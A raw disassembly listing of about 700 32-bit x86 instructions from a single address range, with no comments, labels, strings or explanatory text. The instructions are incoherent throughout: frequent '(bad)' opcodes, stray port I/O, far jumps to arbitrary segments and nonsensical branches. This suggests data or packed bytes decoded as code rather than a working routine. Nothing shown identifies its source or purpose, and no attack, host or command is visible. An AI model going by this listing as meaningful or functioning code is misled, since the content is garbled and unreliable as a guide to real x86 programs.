  421399:	xchg   edx,eax
  42139a:	mov    eax,0x6237199a
  42139f:	test   al,0xcb
  4213a1:	dec    esp
  4213a2:	and    BYTE PTR [edi-0x57b21536],cl
  4213a8:	test   DWORD PTR [ecx-0x41001bfc],edx
  4213ae:	mov    DWORD PTR [ebx+ecx*8+0x439cced4],esi
  4213b5:	jb     0x4213b0
  4213b7:	mov    ebp,DWORD PTR [ebp+0x4eadd6ea]
  4213bd:	push   es
  4213be:	test   DWORD PTR [esi+0x7d],edx
  4213c1:	xor    ecx,DWORD PTR [eax+0x3b]
  4213c4:	in     al,0x45
  4213c6:	int3   
  4213c7:	mov    ds:0x10acd6c1,eax
  4213cc:	jp     0x4213e6
  4213ce:	adc    BYTE PTR [ecx+0x85db44d],al
  4213d4:	mov    al,BYTE PTR [eax-0x777d3782]
  4213da:	dec    ebx
  4213db:	mov    ch,BYTE PTR [ecx]
  4213dd:	xor    al,0x41
  4213df:	pop    edx
  4213e0:	sub    edx,DWORD PTR [eax]
  4213e2:	daa    
  4213e3:	xchg   edi,eax
  4213e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213e5:	and    al,0x5d
  4213e7:	jb     0x4213b0
  4213e9:	inc    ebp
  4213ea:	aaa    
  4213eb:	push   DWORD PTR [ecx]
  4213ed:	jl     0x4213f8
  4213ef:	repz jecxz 0x4213c0
  4213f2:	rcl    DWORD PTR [ebx],cl
  4213f4:	lock arpl WORD PTR [ecx+0x1e8d21a],bx
  4213fb:	jmp    0x953f:0xa3f5a30
  421402:	(bad)  
  421403:	lock rcr DWORD PTR [ecx+0x2a],1
  421407:	cwde   
  421408:	(bad)  
  421409:	pop    edx
  42140a:	out    0x6,eax
  42140c:	mov    esi,0x8badef82
  421411:	fld    DWORD PTR [esi+0x37]
  421414:	aaa    
  421415:	push   0x69
  421417:	in     eax,dx
  421418:	mov    bl,0x89
  42141a:	and    edi,edi
  42141c:	pop    ds
  42141d:	inc    edx
  42141e:	idiv   DWORD PTR ds:0xb3a1db1a
  421424:	loop   0x4213f3
  421426:	mov    esi,0x6e7ee8
  42142b:	mov    edx,0xab5f3334
  421430:	dec    edx
  421431:	jne    0x421439
  421433:	xor    DWORD PTR ds:0xd4945d0a,edi
  421439:	push   ds
  42143a:	dec    ecx
  42143b:	lahf   
  42143c:	sub    BYTE PTR [edx+edi*8+0x1f],bl
  421440:	mov    edx,0x82436c5
  421445:	xor    ebp,esp
  421447:	bnd data16 jp 0x421409
  42144b:	in     al,0x65
  42144d:	popf   
  42144e:	add    al,0x2d
  421450:	jne    0x421489
  421452:	or     ecx,DWORD PTR [edx+0x5d]
  421455:	mov    DWORD PTR [edx-0xf3613a5],0x43fbd4
  42145f:	leave  
  421460:	or     ah,bh
  421462:	aad    0x7
  421464:	jg     0x42149d
  421466:	adc    ebp,DWORD PTR [esi]
  421468:	imul   BYTE PTR [eax-0xf]
  42146b:	sub    al,0x61
  42146d:	pop    edx
  42146e:	ins    BYTE PTR es:[edi],dx
  42146f:	push   eax
  421470:	mul    esp
  421472:	pop    edx
  421473:	or     al,0xdf
  421475:	aaa    
  421476:	pop    esi
  421477:	inc    esp
  421478:	mov    bh,0xa5
  42147a:	cmp    BYTE PTR ds:0xceae523,cl
  421480:	and    ebp,DWORD PTR [ebx+edi*2-0x48e8d41b]
  421487:	and    edx,DWORD PTR [eax]
  421489:	in     al,0x8e
  42148b:	mov    edx,0x75678f47
  421490:	sub    BYTE PTR [ebp+0x6],cl
  421493:	(bad)  
  421494:	cli    
  421495:	retf   
  421496:	or     al,0x9d
  421498:	mov    dl,0x62
  42149a:	call   0x2871f9f5
  42149f:	adc    DWORD PTR [ebp+edi*1+0x7b],edi
  4214a3:	mov    dh,0x5e
  4214a5:	out    dx,eax
  4214a6:	(bad)  
  4214a7:	int3   
  4214a8:	das    
  4214a9:	std    
  4214aa:	int    0x1a
  4214ac:	mov    ecx,0x36d701c9
  4214b1:	cmp    ch,BYTE PTR [eax-0x29]
  4214b4:	pop    edx
  4214b5:	dec    esp
  4214b6:	add    BYTE PTR [ecx+0x34e7051a],dh
  4214bc:	sbb    ebp,0xffffffe0
  4214bf:	aas    
  4214c0:	test   BYTE PTR [ebx+0x16],dh
  4214c3:	fidiv  WORD PTR [edi]
  4214c5:	rol    ebx,cl
  4214c7:	loop   0x4214d0
  4214c9:	xchg   ebp,eax
  4214ca:	pop    ecx
  4214cb:	shl    DWORD PTR [edx-0x28],0xd8
  4214cf:	cdq    
  4214d0:	sub    bl,BYTE PTR [eax]
  4214d2:	(bad)  
  4214d3:	pop    esp
  4214d4:	cmp    al,0x29
  4214d6:	xchg   BYTE PTR [ebx],dh
  4214d8:	push   0x15
  4214da:	inc    edi
  4214db:	mov    cl,0xa9
  4214dd:	ret    
  4214de:	ins    BYTE PTR es:[edi],dx
  4214df:	inc    esi
  4214e0:	xor    DWORD PTR [edi-0x41a1010e],ecx
  4214e6:	(bad)  
  4214e8:	sub    DWORD PTR [edi],edx
  4214ea:	push   esi
  4214eb:	inc    ebx
  4214ec:	dec    esi
  4214ed:	xchg   ecx,eax
  4214ee:	jg     0x42150b
  4214f0:	sub    DWORD PTR [esp+ecx*2],edi
  4214f3:	shl    BYTE PTR [ecx],1
  4214f5:	push   0x51
  4214f7:	loope  0x4214e3
  4214f9:	inc    esp
  4214fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214fb:	xor    al,bl
  4214fd:	fld    QWORD PTR [ebp-0xa]
  421500:	stos   DWORD PTR es:[edi],eax
  421501:	xchg   edi,eax
  421502:	jb     0x42148f
  421504:	es ins BYTE PTR es:[edi],dx
  421506:	(bad)  
  421507:	div    BYTE PTR [ebx+ebx*4-0x5830e97d]
  42150e:	pushf  
  42150f:	aad    0xa5
  421511:	inc    esi
  421512:	rcl    BYTE PTR [eax],0x74
  421515:	sub    BYTE PTR [ecx+0x53],al
  421518:	adc    eax,0xbfc86461
  42151d:	inc    ecx
  42151e:	pop    esp
  42151f:	das    
  421520:	call   0x6d995bce
  421525:	mov    ebx,0xa4c4a2c8
  42152a:	lock push 0x1f
  42152d:	inc    ebp
  42152e:	push   es
  42152f:	cdq    
  421530:	and    edi,edx
  421532:	push   esi
  421533:	call   0x5b76c8b8
  421538:	sub    bl,BYTE PTR ds:0xa02536e6
  42153e:	xchg   ecx,eax
  42153f:	cld    
  421540:	dec    esp
  421541:	sub    ah,cl
  421543:	push   edi
  421544:	ror    DWORD PTR [edx],1
  421546:	add    eax,0x9d7be67d
  42154b:	ret    0x828
  42154e:	or     al,0x67
  421550:	outs   dx,BYTE PTR ds:[esi]
  421551:	scas   al,BYTE PTR es:[edi]
  421552:	xor    edi,DWORD PTR [edi]
  421554:	lods   al,BYTE PTR ds:[esi]
  421555:	xor    al,0x47
  421557:	add    eax,0x9b888024
  42155c:	jns    0x4214e6
  42155e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42155f:	lahf   
  421560:	aas    
  421561:	push   esp
  421562:	push   ecx
  421563:	xlat   BYTE PTR ds:[ebx]
  421564:	cmp    ah,dl
  421566:	and    DWORD PTR [esi-0x3418228],eax
  42156c:	jnp    0x42154f
  42156e:	and    BYTE PTR [edi+edi*4+0x5cdb74f5],ah
  421575:	sbb    ecx,DWORD PTR [edx+0xe]
  421578:	(bad)  
  42157b:	xchg   edi,eax
  42157c:	and    BYTE PTR [edi-0x2da72c1a],0x4c
  421583:	pushf  
  421584:	fld    TBYTE PTR cs:[ecx+0x10]
  421588:	or     BYTE PTR [ecx+0x2a8fb62],0xb6
  42158f:	jl     0x4215d0
  421591:	(bad)  
  421592:	push   eax
  421593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421594:	push   ecx
  421595:	mov    ebx,0x31d06379
  42159a:	adc    eax,0x29eb413a
  42159f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215a0:	cmc    
  4215a1:	xlat   BYTE PTR fs:[ebx]
  4215a3:	(bad)  
  4215a5:	outs   dx,BYTE PTR ds:[esi]
  4215a6:	sbb    eax,0x41a1120
  4215ab:	imul   ebx,DWORD PTR [ebp-0x3d26395],0xd5997150
  4215b5:	push   esp
  4215b6:	push   ds
  4215b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215b8:	and    eax,0x1bd40e0
  4215bd:	push   ecx
  4215be:	adc    DWORD PTR [edi+edx*1+0x67d2bf4d],ecx
  4215c5:	xor    ebx,0xfffffff2
  4215c8:	out    dx,al
  4215c9:	mov    esi,0x7a39757c
  4215ce:	stos   DWORD PTR es:[edi],eax
  4215cf:	sbb    BYTE PTR [esi+0x0],cl
  4215d2:	call   0xa6913f74
  4215d7:	push   esi
  4215d8:	pop    es
  4215d9:	(bad)  
  4215da:	fwait
  4215db:	mov    BYTE PTR [ecx+edi*2+0x7c],dh
  4215df:	cmp    eax,0x284faef9
  4215e4:	adc    ch,ch
  4215e6:	xor    DWORD PTR [edx+0x34],ecx
  4215e9:	jle    0x42163d
  4215eb:	int3   
  4215ec:	adc    bl,BYTE PTR [edx]
  4215ee:	inc    ecx
  4215ef:	ins    BYTE PTR es:[edi],dx
  4215f0:	pop    ecx
  4215f1:	xchg   ecx,esi
  4215f3:	sub    BYTE PTR [eax-0x74f71e9e],ah
  4215f9:	or     al,0xb4
  4215fb:	inc    edx
  4215fc:	addr16 xchg edi,eax
  4215fe:	sub    eax,0x4f039b1d
  421603:	xchg   ebp,eax
  421604:	iret   
  421605:	adc    BYTE PTR [ecx-0xdbf38e8],ch
  42160b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42160c:	xchg   esi,eax
  42160d:	popf   
  42160e:	fistp  DWORD PTR [ebp+0x4c]
  421611:	or     al,0x19
  421613:	add    eax,0xd2bff8f9
  421618:	dec    edi
  421619:	(bad)
  42161d:	repnz lea ebx,[ebx]
  421620:	imul   esp,DWORD PTR [ecx+0x4d],0x677737e1
  421627:	sbb    edi,DWORD PTR [esi+0x5d]
  42162a:	mov    edx,DWORD PTR [ecx+0x70]
  42162d:	aam    0x71
  42162f:	fdivr  QWORD PTR [edi+0x241ebc29]
  421635:	add    eax,0x7f13f2e4
  42163a:	int3   
  42163b:	and    al,0x3a
  42163d:	jns    0x4216ad
  42163f:	mov    cs,WORD PTR [edi+eax*2+0x60]
  421643:	mov    edx,0xd06a1e62
  421648:	jge    0x4216c2
  42164a:	push   cs
  42164b:	dec    ecx
  42164c:	pop    edx
  42164d:	cli    
  42164e:	or     al,0x95
  421650:	lahf   
  421651:	in     al,0x23
  421653:	enter  0x9d88,0xad
  421657:	push   0x72
  421659:	aas    
  42165a:	fimul  WORD PTR [ebp+0x23]
  42165d:	sub    eax,DWORD PTR ds:0x174f36fb
  421663:	daa    
  421664:	jo     0x42161d
  421666:	sar    BYTE PTR [ebx],0x8
  421669:	pop    edi
  42166a:	(bad)  
  42166c:	ins    DWORD PTR es:[edi],dx
  42166d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42166e:	hlt    
  42166f:	inc    eax
  421670:	bound  ebx,QWORD PTR [edi+0x68]
  421673:	pop    cx
  421675:	jae    0x421619
  421677:	or     edi,DWORD PTR [esi-0x12ef0b1f]
  42167d:	push   esp
  42167e:	lea    eax,[ebx+0x6cf73232]
  421684:	pop    ebx
  421685:	loope  0x421637
  421687:	push   0x39
  421689:	xchg   esi,eax
  42168a:	xor    eax,DWORD PTR [edx]
  42168c:	sar    esi,0xdd
  42168f:	out    0xf6,eax
  421691:	cmp    al,al
  421693:	jmp    0x4216aa
  421695:	xchg   esi,eax
  421696:	lods   eax,DWORD PTR ds:[esi]
  421697:	inc    esi
  421698:	popf   
  421699:	popf   
  42169a:	push   ds
  42169b:	stos   BYTE PTR es:[edi],al
  42169c:	out    0x3e,eax
  42169e:	xor    DWORD PTR ss:[ecx],esp
  4216a1:	sahf   
  4216a2:	in     al,0xd9
  4216a4:	push   0xf2411ad7
  4216a9:	xchg   edx,eax
  4216aa:	xchg   edi,eax
  4216ab:	inc    edi
  4216ac:	scas   eax,DWORD PTR es:[edi]
  4216ad:	out    dx,eax
  4216ae:	add    DWORD PTR [ecx],ebx
  4216b0:	sar    DWORD PTR [esi-0x35cfc49b],1
  4216b6:	add    bh,BYTE PTR [edi]
  4216b8:	or     eax,0x10304b31
  4216bd:	repnz jmp 0x30f5:0x14399dbc
  4216c5:	sbb    BYTE PTR [ebx+0x458cd1ec],dh
  4216cb:	mov    ecx,0x8ec15027
  4216d0:	retf   0x2afe
  4216d3:	ss sahf 
  4216d5:	mov    eax,0x175a5470
  4216da:	repnz lods eax,DWORD PTR ds:[esi]
  4216dc:	jno    0x4216ca
  4216de:	call   0x4f8a:0x22a17dae
  4216e5:	test   al,0x2a
  4216e7:	xchg   esp,eax
  4216e8:	push   0xffffff8a
  4216ea:	sub    DWORD PTR [esi+0x70557d4a],ecx
  4216f0:	ret    
  4216f1:	mov    eax,ds:0x4db5bb10
  4216f6:	shl    BYTE PTR [edx],0xc
  4216f9:	mov    edi,0xffad370c
  4216fe:	add    eax,DWORD PTR [ebx-0x5e56dc76]
  421704:	sub    BYTE PTR [ecx-0x4e],0x78
  421708:	inc    edx
  421709:	icebp  
  42170a:	push   ebp
  42170b:	xor    bh,BYTE PTR [edx+eax*1]
  42170e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42170f:	loop   0x421787
  421711:	or     bl,BYTE PTR [edi+0x1d]
  421714:	or     dh,BYTE PTR gs:[edx]
  421717:	fldcw  WORD PTR [ecx]
  421719:	mov    al,0xba
  42171b:	cwde   
  42171c:	add    DWORD PTR [eax],eax
  42171e:	mov    ebx,0x1f2349c2
  421723:	or     cl,bh
  421725:	inc    edi
  421726:	test   BYTE PTR [ebx-0x40652ced],ah
  42172c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42172d:	sub    al,0x34
  42172f:	inc    ecx
  421730:	cmc    
  421731:	jo     0x421771
  421733:	in     eax,0x7a
  421735:	pop    ebx
  421736:	push   eax
  421737:	xchg   ebx,eax
  421738:	fs jmp 0xbf31:0x146d8469
  421740:	fs mov edi,0x1c70dcdb
  421746:	cmp    eax,0x77111d5b
  42174b:	sbb    bh,bl
  42174d:	repnz adc DWORD PTR [ecx],esp
  421750:	sub    esi,ecx
  421752:	jo     0x42174a
  421754:	push   ss
  421755:	mov    eax,0xa3de8832
  42175a:	into   
  42175b:	or     al,BYTE PTR [esi]
  42175d:	(bad)  [edx-0x18590996]
  421763:	repz sub dl,0xb8
  421767:	je     0x4217e7
  421769:	in     al,dx
  42176a:	jo     0x421765
  42176c:	adc    eax,0xcc8ea5b3
  421771:	test   al,0xfd
  421773:	int3   
  421774:	aam    0x74
  421776:	adc    BYTE PTR [ecx+0x22],al
  421779:	push   esi
  42177a:	(bad)  
  42177b:	out    dx,al
  42177c:	dec    edi
  42177d:	jmp    0xc247:0x3a92d527
  421784:	sbb    DWORD PTR [edx],edx
  421786:	retf   
  421787:	jns    0x421793
  421789:	loope  0x421744
  42178b:	mov    ebx,eax
  42178d:	test   dh,bl
  42178f:	adc    BYTE PTR [esi-0x3f],bl
  421792:	adc    eax,0xc645da97
  421797:	sbb    al,BYTE PTR [esi+0x309f221d]
  42179d:	dec    esi
  42179e:	ficomp DWORD PTR [esi+0x64ae6b2e]
  4217a4:	out    0xc2,eax
  4217a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217a7:	add    BYTE PTR [edi],al
  4217a9:	cdq    
  4217aa:	in     eax,dx
  4217ab:	ds stos BYTE PTR es:[edi],al
  4217ad:	sbb    cl,BYTE PTR [eax+0x70234c72]
  4217b3:	jge    0x421807
  4217b5:	lock and BYTE PTR [edi-0x5df6fb80],bh
  4217bc:	inc    edx
  4217bd:	dec    ebx
  4217be:	fsubp  st(1),st
  4217c0:	clc    
  4217c1:	mov    esp,edi
  4217c3:	popa   
  4217c4:	mov    DWORD PTR [edx-0x35],ecx
  4217c7:	lods   al,BYTE PTR ds:[esi]
  4217c8:	cmc    
  4217c9:	clc    
  4217ca:	jmp    0x42179e
  4217cc:	add    eax,0x56eae998
  4217d1:	jl     0x42182f
  4217d3:	ja     0x421845
  4217d5:	not    DWORD PTR [ebx-0x150ff39]
  4217db:	mov    BYTE PTR [ecx+0x48],dl
  4217de:	sbb    edi,ebx
  4217e0:	inc    ebx
  4217e1:	call   0x3203:0x8a29ad
  4217e8:	(bad)  
  4217ea:	sub    dh,BYTE PTR [ecx]
  4217ec:	xchg   esp,eax
  4217ed:	ins    DWORD PTR es:[edi],dx
  4217ee:	adc    BYTE PTR [eax+0x7b],0x35
  4217f2:	add    BYTE PTR [ecx-0x728e51d1],bl
  4217f8:	call   0x73da4f75
  4217fd:	dec    ebp
  4217fe:	cmp    al,0xb6
  421800:	jo     0x4217b3
  421802:	xchg   edx,eax
  421803:	inc    eax
  421804:	xchg   BYTE PTR [eax-0x2dbc9b45],ah
  42180a:	adc    eax,DWORD PTR [edx-0x5c934538]
  421810:	inc    esp
  421811:	add    esp,DWORD PTR ds:0x3ddb70f2
  421817:	in     al,0x7b
  421819:	fisub  WORD PTR [ebx]
  42181b:	jne    0x421881
  42181d:	les    edx,FWORD PTR [esi+0x7a]
  421820:	sbb    eax,0xbb5c423
  421825:	sub    esp,ecx
  421827:	sub    ah,bh
  421829:	lds    ecx,FWORD PTR [esi+edx*4+0x42355e06]
  421830:	add    DWORD PTR [edi],edi
  421832:	jmp    0xe0cead74
  421837:	aas    
  421838:	add    eax,0x9590a7a0
  42183d:	(bad)  
  42183e:	pop    edi
  42183f:	mov    ebx,0xbb0067c7
  421844:	fcomp  DWORD PTR [esi-0x7f]
  421847:	call   0xb8fc:0xd79ce91f
  42184e:	bound  ecx,QWORD PTR [eax+ecx*4+0x22d6ecb0]
  421855:	pop    edi
  421856:	outs   dx,BYTE PTR ds:[esi]
  421857:	aad    0xb4
  421859:	fwait
  42185a:	aam    0xdb
  42185c:	sbb    dl,al
  42185e:	pop    ds
  42185f:	jmp    0xf241:0x5241f2c3
  421866:	dec    ebx
  421867:	pop    ebx
  421868:	dec    ebx
  421869:	cmp    eax,0x8662cad1
  42186e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42186f:	nop
  421870:	jns    0x421816
  421872:	aas    
  421873:	frndint 
  421875:	loop   0x421850
  421877:	sub    DWORD PTR [edx+0x7f],edi
  42187a:	xor    BYTE PTR [edx-0x3c],dl
  42187d:	jmp    0xbd8c3005
  421882:	(bad)  
  421883:	nop
  421884:	mov    ebp,DWORD PTR [ebp+eiz*4-0x35cc58b5]
  42188b:	or     eax,DWORD PTR [edx+0x77]
  42188e:	je     0x42183e
  421890:	add    eax,0xdbe57764
  421895:	cdq    
  421896:	not    BYTE PTR [eax-0x44e1de56]
  42189c:	jb     0x4218de
  42189e:	jle    0x4218b8
  4218a0:	mov    ch,0x95
  4218a2:	js     0x4218c4
  4218a4:	das    
  4218a5:	bound  esp,QWORD PTR [ecx-0x49]
  4218a8:	cmp    al,0xbe
  4218aa:	push   ebp
  4218ab:	adc    BYTE PTR [ebx-0x26],dl
  4218ae:	ror    DWORD PTR ds:0xca95db53,0x9a
  4218b5:	xchg   edi,eax
  4218b6:	(bad)  
  4218b7:	pop    ss
  4218b8:	imul   ebx,edi,0x887abbb8
  4218be:	xlat   BYTE PTR ds:[ebx]
  4218bf:	cmp    DWORD PTR [ebx],esp
  4218c1:	in     al,dx
  4218c2:	stc    
  4218c3:	dec    edx
  4218c4:	cld    
  4218c5:	ror    al,cl
  4218c7:	pusha  
  4218c8:	mov    al,0xc7
  4218ca:	xor    eax,DWORD PTR [edx+0x1d]
  4218cd:	jb     0x4218fe
  4218cf:	scas   al,BYTE PTR es:[edi]
  4218d0:	jl     0x42192a
  4218d2:	jns    0x421907
  4218d4:	add    eax,0xe4802892
  4218d9:	arpl   WORD PTR [ebp+ecx*2+0x44],cx
  4218dd:	sub    eax,0xa5baac28
  4218e2:	shl    BYTE PTR [esi+0x2f],1
  4218e5:	jl     0x42186f
  4218e7:	scas   al,BYTE PTR es:[edi]
  4218e8:	jle    0x42189b
  4218ea:	add    DWORD PTR [eax+0x4a],edi
  4218ed:	aaa    
  4218ee:	cmp    BYTE PTR [esi],bh
  4218f0:	mov    dh,0xde
  4218f2:	stos   BYTE PTR es:[edi],al
  4218f3:	pop    ecx
  4218f4:	inc    ebp
  4218f5:	popa   
  4218f6:	mov    ah,cl
  4218f8:	pusha  
  4218f9:	sub    al,0x6f
  4218fb:	pop    edx
  4218fc:	adc    edx,DWORD PTR [edi]
  4218fe:	int3   
  4218ff:	xchg   esi,eax
  421900:	jae    0x4218f9
  421902:	imul   ecx,esi,0xa9b17b61
  421908:	repz pop edi
  42190a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42190b:	(bad)
  42190e:	std    
  42190f:	pmullw mm0,QWORD PTR ds:0xef9644ad
  421916:	leave  
  421917:	test   eax,0x9ae413f8
  42191c:	mov    esp,0x930de7a9
  421921:	add    al,0x31
  421923:	stc    
  421924:	fs int 0xfb
  421927:	pop    edx
  421928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421929:	scas   al,BYTE PTR es:[edi]
  42192a:	mov    edx,0xc84f36c6
  42192f:	aad    0xc0
  421931:	nop
  421932:	nop
  421933:	xor    BYTE PTR [ebx+0x49],al
  421936:	or     eax,0x5c05ec31
  42193b:	outs   dx,DWORD PTR ds:[esi]
  42193c:	ret    0xe35a
  42193f:	add    esp,DWORD PTR [ebp+edi*2+0x280d4ea2]
  421946:	mov    ch,0x4
  421948:	enter  0x3915,0xe5
  42194c:	xchg   ecx,eax
  42194d:	xor    edx,DWORD PTR [ecx-0x39af936c]
  421953:	int    0xb0
  421955:	mov    cl,0x2a
  421957:	xchg   ebp,eax
  421958:	cmp    BYTE PTR [ebp+0xf662f4f],ah
  42195e:	mov    ecx,0x29717952
  421963:	ret    0x73d3
  421966:	add    ebp,ebp
  421968:	jns    0x421907
  42196a:	bound  ecx,QWORD PTR [si+0x71e8]
  42196f:	pop    esi
  421970:	fwait
  421971:	bound  esi,QWORD PTR [ecx]
  421973:	push   0xffffffc2
  421975:	pop    edi
  421976:	cmp    esp,eax
  421978:	mov    eax,DWORD PTR [edx]
  42197a:	imul   eax,DWORD PTR [ebp+0x68a94ed4],0x4e
  421981:	int    0xc1
  421983:	enter  0x1720,0x1c
  421987:	and    edx,DWORD PTR [ebp+edi*2-0x33]
  42198b:	mov    al,ds:0x3b2a82f3
  421990:	fcom   st(7)
  421992:	outs   dx,DWORD PTR ds:[esi]
  421993:	xor    DWORD PTR [ecx+0x2f],esp
  421996:	(bad)  
  421997:	mov    ecx,0xad78ac66
  42199c:	ja     0x421a1a
  42199e:	ins    DWORD PTR es:[edi],dx
  42199f:	inc    esp
  4219a0:	mov    dh,BYTE PTR [edx+0x4aa2adf1]
  4219a6:	int    0xbf
  4219a8:	xchg   edi,eax
  4219a9:	stc    
  4219aa:	lods   al,BYTE PTR ds:[esi]
  4219ab:	mov    ecx,0x35326d76
  4219b0:	push   esp
  4219b1:	lahf   
  4219b2:	inc    esi
  4219b3:	mov    WORD PTR [ebp+ecx*2+0x3],es
  4219b7:	add    DWORD PTR [edx-0x37],ecx
  4219ba:	hlt    
  4219bb:	lods   al,BYTE PTR ds:[esi]
  4219bc:	daa    
  4219bd:	push   edx
  4219be:	ss addr16 adc dl,cl
  4219c2:	out    0xf,al
  4219c4:	movups xmm1,xmm5
  4219c7:	mov    BYTE PTR ds:0x79f8b166,0xea
  4219ce:	mov    ebx,0x73e76f1a
  4219d3:	rcr    DWORD PTR [ebx-0x61188f00],1
  4219d9:	mov    bh,0xb4
  4219db:	inc    ecx
  4219dc:	pop    ebx
  4219dd:	cmp    al,BYTE PTR [ebx+0x8]
  4219e0:	pop    ebp
  4219e1:	int    0x1f
  4219e3:	dec    edx
  4219e4:	sbb    al,0x1e
  4219e6:	call   0xd82998bd
  4219eb:	fstp   TBYTE PTR [eax+ebx*4-0x63]
  4219ef:	stos   BYTE PTR es:[edi],al
  4219f0:	data16 out dx,al
  4219f2:	mov    bl,0x99
  4219f4:	sub    BYTE PTR [ebx-0x2c704b25],dh
  4219fa:	inc    ebp
  4219fb:	outs   dx,BYTE PTR ds:[esi]
  4219fc:	jmp    0x4219e2
  4219fe:	fdiv   st(1),st
  421a00:	dec    esp
  421a01:	pop    edx
  421a02:	and    al,0xd6
  421a04:	cwde   
  421a05:	call   0x245c:0x5542bcee
  421a0c:	mov    ds:0x2ff918ba,eax
  421a11:	(bad)  
  421a12:	jp     0x421a1d
  421a14:	push   0x45
  421a16:	popa   
  421a17:	ins    BYTE PTR es:[edi],dx
  421a18:	push   esi
  421a19:	shl    BYTE PTR [esi-0x61],cl
  421a1c:	icebp  
  421a1d:	xchg   esp,eax
  421a1e:	jne    0x421a3b
  421a20:	cmp    eax,0x869a1571
  421a25:	adc    DWORD PTR [ebx+0x272f52e7],ebp
  421a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a2c:	jecxz  0x4219b6
  421a2e:	jle    0x421a69
  421a30:	mov    bl,0x51
  421a32:	mov    esi,0x2f53ac21
  421a37:	jnp    0x421a86
  421a39:	jle    0x421a7c
  421a3b:	lock cmp al,0xe
  421a3e:	test   DWORD PTR [edi],ecx
  421a40:	sbb    ecx,DWORD PTR [ebx+0x3b]
  421a43:	aaa    
  421a44:	jmp    0x9a069ac8
  421a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a4a:	int    0xa6
  421a4c:	xor    BYTE PTR [ecx+edi*8-0x25],cl
  421a50:	mov    esp,0xc5411f2c
  421a55:	out    dx,al
  421a56:	test   ecx,0xd33e2ed3
  421a5c:	bound  edi,QWORD PTR [eax+0x63]
  421a5f:	push   ds
  421a60:	clc    
  421a61:	jne    0x421a5c
  421a63:	aas    
  421a64:	xlat   BYTE PTR ds:[ebx]
  421a65:	pop    es
  421a66:	ror    cl,cl
  421a68:	pop    edx
  421a69:	add    eax,0x3c12ba5a
  421a6e:	jecxz  0x421a4b
  421a70:	aaa    
  421a71:	loopne 0x421a5c
  421a73:	xchg   BYTE PTR [edi],cl
  421a75:	sbb    ebp,DWORD PTR [edx+0x1e]
  421a78:	pop    eax
  421a79:	push   ecx
  421a7a:	mov    dl,0xbf
  421a7c:	ret    
  421a7d:	cli    
  421a7e:	retf   
  421a7f:	dec    esp
  421a80:	xor    bh,cl
  421a82:	sti    
  421a83:	xlat   BYTE PTR ds:[ebx]
  421a84:	inc    edi
  421a85:	push   0x6e29e3b
  421a8a:	fmul   DWORD PTR [edx+0x3a5f1f72]
  421a90:	xchg   ebx,eax
  421a91:	cmp    dh,BYTE PTR [eax]
  421a93:	cmp    BYTE PTR [esi],bh
  421a95:	add    bl,BYTE PTR [ebx]
  421a97:	imul   esi,edx,0xfe89f7bf
  421a9d:	mov    edx,0x5776072d
  421aa2:	sub    dh,dh
  421aa4:	lods   al,BYTE PTR ds:[esi]
  421aa5:	mov    BYTE PTR [edi+edx*1-0x4ade85c8],bh
  421aac:	in     al,dx
  421aad:	ja     0x421aaa
  421aaf:	inc    eax
  421ab0:	pop    ds
  421ab1:	sar    ah,cl
  421ab3:	jle    0x421a99
  421ab5:	loop   0x421aa6
  421ab7:	repz inc esi
  421ab9:	xchg   DWORD PTR [edi-0x51],ebp
  421abc:	add    ah,al
  421abe:	dec    esp
  421abf:	fidivr DWORD PTR [ebp+eax*8-0xc]
  421ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ac4:	mov    ah,0x90
  421ac6:	scas   eax,DWORD PTR es:[edi]
  421ac7:	call   0xbaab7554
  421acc:	out    0x1c,eax
  421ace:	push   0x45
  421ad0:	xchg   ebx,eax
  421ad1:	pop    ecx
  421ad2:	fs xchg ecx,eax
  421ad4:	mov    gs,ebx
  421ad6:	addr16 jge 0x421b3b
  421ad9:	or     al,0x6d
  421adb:	sub    eax,0xcae1aade
  421ae0:	jecxz  0x421b2f
  421ae2:	mov    eax,ds:0x28f22e0d
  421ae7:	addr16 pop ds
  421ae9:	sbb    al,0xd4
  421aeb:	sbb    DWORD PTR [ebx],edx
  421aed:	rol    BYTE PTR [ebx-0x5b84468a],cl
  421af3:	cld    
  421af4:	jmp    0x21aea9bb
  421af9:	jecxz  0x421ab3
  421afb:	or     bh,BYTE PTR [ebx]
  421afd:	mov    ch,cl
  421aff:	xor    eax,0xb5b8448f
  421b04:	mov    eax,ds:0xf6fcc86
  421b09:	cli    
  421b0a:	mov    ch,0xb6
  421b0c:	pushf  
  421b0d:	xchg   bh,al
  421b0f:	hlt    
  421b10:	(bad)  
  421b11:	mov    ah,0x9d
  421b13:	aad    0xfe
  421b15:	out    0xe0,al
  421b17:	jo     0x421b12
  421b19:	pop    es
  421b1a:	push   0xffffffd5
  421b1c:	cli    
  421b1d:	pop    esp
  421b1e:	jmp    0x644c:0x632415e
  421b25:	add    dl,ah
  421b27:	popa   
  421b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b29:	adc    BYTE PTR [edi],dl
  421b2b:	out    0xf8,al
  421b2d:	scas   al,BYTE PTR es:[edi]
  421b2e:	ret    
  421b2f:	test   ah,al
  421b31:	daa    
  421b32:	mov    edx,0xfaa99ff7
  421b37:	test   BYTE PTR [ebp-0x20],0xbb
  421b3b:	(bad)  
  421b3c:	aam    0xba
  421b3e:	sub    eax,0x7feaca77
  421b43:	gs push edx
  421b45:	test   al,0x52
  421b47:	xchg   esi,eax
  421b48:	loopne 0x421b8c
  421b4a:	bound  ebx,QWORD PTR [eax-0xc]
  421b4d:	xchg   esp,eax
